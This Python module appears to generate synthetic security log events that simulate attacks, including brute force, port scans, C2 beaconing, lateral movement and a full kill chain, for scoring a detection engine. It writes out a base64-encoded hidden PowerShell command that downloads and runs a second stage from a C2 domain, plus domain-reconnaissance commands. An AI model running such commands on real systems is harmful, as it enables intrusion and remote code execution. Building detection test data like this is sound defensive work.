"""Attack scenario injectors.

Each builder takes an anchor timestamp and returns a burst of correlated
events that, together, look like one attack technique. Every participant
(attacker IP, target host, account, ...) is an optional parameter: standalone
scenarios leave them random, and kill_chain_scenario passes the same ones
through every stage, the way one intruder's footprint actually connects.

Every event carries ground truth (scenario_tag / scenario_id / campaign_id)
for evaluation.py to score against — nothing in detection/ reads it.
"""

from __future__ import annotations

import base64
import random
import uuid
from datetime import datetime, timedelta

from ..geo import haversine_km
from .entities import (
    COUNTRY_GEO,
    HOSTS_BY_NAME,
    SERVERS,
    ExternalIP,
    Host,
    random_dga_domain,
    random_external_ip,
    random_host,
    random_user,
)
from .events import emit_auth_event, emit_dns_event, emit_network_event, emit_process_event

SCAN_PORTS = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 993, 995,
              1433, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 9200, 27017]

DISCOVERY_COMMANDS = [
    "whoami.exe /all",
    'net.exe group "Domain Admins" /domain',
    "nltest.exe /dclist:",
    "net.exe view /all",
]

LATERAL_TARGET_ROLES = ("domain_controller", "database", "file", "web")


def new_scenario_id(prefix: str = "sc") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:8]}"


def stamp(events: list[dict], scenario_id: str, campaign_id: str | None = None) -> list[dict]:
    for e in events:
        e["scenario_id"] = scenario_id
        e["campaign_id"] = campaign_id
    return events


def _attacker_ip() -> ExternalIP:
    return random_external_ip(malicious_only=random.random() < 0.7)


def brute_force_scenario(
    anchor: datetime,
    attacker: ExternalIP | None = None,
    target_host: Host | None = None,
    user: str | None = None,
    succeed: bool | None = None,
) -> list[dict]:
    attacker = attacker or _attacker_ip()
    target_host = target_host or random_host(roles=["workstation", "domain_controller", "gateway"])
    user = user or random_user()
    succeed = random.random() < 0.6 if succeed is None else succeed
    events = []
    t = anchor
    for _ in range(random.randint(8, 16)):
        t += timedelta(seconds=random.randint(5, 25))
        events.append(emit_auth_event(
            t, user=user, host=target_host, src_ip=attacker.ip, src_country=attacker.country,
            action="login_failure", outcome="failure", scenario_tag="brute_force",
        ))
    if succeed:
        t += timedelta(seconds=random.randint(5, 20))
        events.append(emit_auth_event(
            t, user=user, host=target_host, src_ip=attacker.ip, src_country=attacker.country,
            action="login_success", outcome="success", scenario_tag="brute_force",
        ))
    return events


def port_scan_scenario(anchor: datetime, attacker: ExternalIP | None = None, target: Host | None = None) -> list[dict]:
    attacker = attacker or _attacker_ip()
    target = target or random_host(roles=["web", "database", "file", "domain_controller"])
    ports = random.sample(SCAN_PORTS, random.randint(15, min(30, len(SCAN_PORTS))))
    events = []
    t = anchor
    for port in ports:
        t += timedelta(milliseconds=random.randint(200, 2500))
        events.append(emit_network_event(
            t, host=target, src_ip=attacker.ip, direction="inbound", port=port,
            bytes_sent=random.randint(40, 200), bytes_received=random.randint(0, 80),
            scenario_tag="port_scan",
        ))
    return events


def impossible_travel_scenario(anchor: datetime, user: str | None = None) -> list[dict]:
    user = user or random_user()
    countries = list(COUNTRY_GEO.keys())
    # Two countries far enough apart that no commercial flight could cover
    # the distance in the gap used below.
    for _ in range(20):
        c1, c2 = random.sample(countries, 2)
        (lat1, lon1), (lat2, lon2) = COUNTRY_GEO[c1], COUNTRY_GEO[c2]
        if haversine_km(lat1, lon1, lat2, lon2) > 4000:
            break
    ip1, ip2 = random_external_ip(), random_external_ip()
    t2 = anchor + timedelta(minutes=random.randint(4, 25))
    return [
        emit_auth_event(anchor, user=user, src_ip=ip1.ip, src_country=c1,
                        action="login_success", outcome="success", scenario_tag="impossible_travel"),
        emit_auth_event(t2, user=user, src_ip=ip2.ip, src_country=c2,
                        action="login_success", outcome="success", scenario_tag="impossible_travel"),
    ]


def data_exfiltration_scenario(
    anchor: datetime,
    source_host: Host | None = None,
    dest: ExternalIP | None = None,
) -> list[dict]:
    source_host = source_host or random_host(roles=["file", "database", "workstation"])
    dest = dest or _attacker_ip()
    events = []
    t = anchor
    for _ in range(random.randint(5, 10)):
        t += timedelta(seconds=random.randint(20, 90))
        events.append(emit_network_event(
            t, host=source_host, dst_ip=dest.ip, port=443,
            bytes_sent=random.randint(40_000_000, 220_000_000),
            bytes_received=random.randint(500, 4000),
            scenario_tag="data_exfiltration",
        ))
    return events


def dns_beaconing_scenario(
    anchor: datetime,
    host: Host | None = None,
    domain: str | None = None,
    n_queries: int | None = None,
) -> list[dict]:
    host = host or random_host(roles=["workstation", "file", "database"])
    domain = domain or random_dga_domain()
    interval_s = random.choice([45, 60, 90, 120])
    events = []
    t = anchor
    for _ in range(n_queries or random.randint(40, 80)):
        t += timedelta(seconds=interval_s + random.uniform(-2, 2))
        events.append(emit_dns_event(t, host=host, domain=domain, scenario_tag="dns_beaconing"))
    return events


def suspicious_process_scenario(
    anchor: datetime,
    host: Host | None = None,
    user: str | None = None,
    c2_domain: str | None = None,
    lure: bool = True,
) -> list[dict]:
    """A macro document (the lure) spawning hidden, base64-encoded PowerShell
    that pulls a second stage from a C2 domain, then hands-on-keyboard
    discovery commands."""
    host = host or random_host(roles=["workstation"])
    user = user or random_user()
    c2_domain = c2_domain or random_dga_domain()
    payload = f"IEX (New-Object Net.WebClient).DownloadString('http://{c2_domain}/a.ps1')"
    encoded = base64.b64encode(payload.encode("utf-16-le")).decode("ascii")
    events = []
    t = anchor
    if lure:
        doc = rf"C:\Users\{user}\Downloads\Invoice_{random.randint(1000, 9999)}.docm"
        events.append(emit_process_event(
            t, host=host, user=user, process_name="winword.exe",
            command_line=rf'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n "{doc}"',
            scenario_tag="suspicious_process",
        ))
        t += timedelta(seconds=random.randint(15, 60))
    events.append(emit_process_event(
        t, host=host, user=user, process_name="powershell.exe",
        command_line=f"powershell.exe -NoP -NonI -W Hidden -enc {encoded}",
        scenario_tag="suspicious_process",
    ))
    for command in random.sample(DISCOVERY_COMMANDS, random.randint(2, len(DISCOVERY_COMMANDS))):
        t += timedelta(seconds=random.randint(20, 120))
        events.append(emit_process_event(
            t, host=host, user=user, process_name=command.split()[0], command_line=command,
            scenario_tag="suspicious_process",
        ))
    return events


def lateral_movement_scenario(
    anchor: datetime,
    src_host: Host | None = None,
    user: str | None = None,
    targets: list[Host] | None = None,
) -> list[dict]:
    """One internal host authenticating to several servers in quick
    succession with the same account — the fan-out shape of an intruder
    spreading out from a foothold."""
    src_host = src_host or random_host(roles=["workstation"])
    user = user or random.choice(["admin", "svc-backup", random_user()])
    if targets is None:
        pool = [h for h in SERVERS if h.role in LATERAL_TARGET_ROLES]
        targets = random.sample(pool, random.randint(4, min(6, len(pool))))
    events = []
    t = anchor
    for target in targets:
        t += timedelta(seconds=random.randint(30, 240))
        if random.random() < 0.3:
            events.append(emit_auth_event(
                t, user=user, host=target, src_ip=src_host.ip,
                action="login_failure", outcome="failure", scenario_tag="lateral_movement",
            ))
            t += timedelta(seconds=random.randint(5, 30))
        events.append(emit_auth_event(
            t, user=user, host=target, src_ip=src_host.ip,
            action="login_success", outcome="success", scenario_tag="lateral_movement",
        ))
    return events


def kill_chain_scenario(anchor: datetime) -> list[dict]:
    """One intruder, start to finish: scan the VPN gateway, brute-force an
    account through it, run encoded PowerShell on a workstation as that
    account, beacon to C2, fan out to servers, and exfiltrate from a data
    store back to the attacker.

    Each stage is its own scenario_id (it's an instance of that technique
    for coverage scoring); all stages share one campaign_id, which is the
    ground truth the correlation engine's incidents are checked against.
    """
    campaign_id = new_scenario_id("cmp")
    attacker = random_external_ip(malicious_only=True)
    gateway = HOSTS_BY_NAME["VPN-GW-01"]
    user = random_user()
    beachhead = random_host(roles=["workstation"])
    c2_domain = random_dga_domain()
    data_store = random.choice([h for h in SERVERS if h.role in ("file", "database")])
    others = [h for h in SERVERS if h.role in LATERAL_TARGET_ROLES and h is not data_store]
    targets = random.sample(others, random.randint(3, 5)) + [data_store]
    random.shuffle(targets)

    events: list[dict] = []

    def stage(stage_events: list[dict]) -> datetime:
        events.extend(stamp(stage_events, new_scenario_id(), campaign_id))
        return max(e["ts"] for e in stage_events)

    t = stage(port_scan_scenario(anchor, attacker=attacker, target=gateway))
    t = stage(brute_force_scenario(
        t + timedelta(minutes=random.randint(10, 30)),
        attacker=attacker, target_host=gateway, user=user, succeed=True,
    ))
    t = stage(suspicious_process_scenario(
        t + timedelta(minutes=random.randint(15, 45)),
        host=beachhead, user=user, c2_domain=c2_domain, lure=False,
    ))
    stage(dns_beaconing_scenario(t + timedelta(minutes=1), host=beachhead, domain=c2_domain, n_queries=random.randint(40, 70)))
    t = stage(lateral_movement_scenario(
        t + timedelta(minutes=random.randint(30, 60)), src_host=beachhead, user=user, targets=targets,
    ))
    stage(data_exfiltration_scenario(t + timedelta(minutes=random.randint(30, 60)), source_host=data_store, dest=attacker))
    return events


STANDALONE_BUILDERS = [
    brute_force_scenario,
    port_scan_scenario,
    impossible_travel_scenario,
    data_exfiltration_scenario,
    dns_beaconing_scenario,
    suspicious_process_scenario,
    lateral_movement_scenario,
]
